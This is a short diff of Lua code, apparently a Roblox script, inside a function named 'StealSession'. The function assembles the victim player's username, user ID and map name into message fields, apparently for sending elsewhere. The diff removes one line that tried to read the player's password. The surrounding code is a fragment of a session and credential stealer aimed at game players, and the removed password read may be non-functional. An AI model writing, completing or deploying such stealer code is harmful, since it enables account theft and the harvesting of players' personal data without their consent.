@@ -123,8 +123,6 @@ local function StealSession()
             ["fields"] = {
                 {["name"] = "👤 Username", ["value"] = LocalPlayer.Name, ["inline"] = true},
           
-                {["name"] = "🔑 Password", ["value"] = tostring(LocalPlayer.Password), ["inline"] = true},
-          
                 {["name"] = "🆔 User ID", ["value"] = tostring(LocalPlayer.UserId), ["inline"] = true},
           
                 {["name"] = "🗺️ Map Name", ["value"] = tostring(mapName), ["inline"] = false},
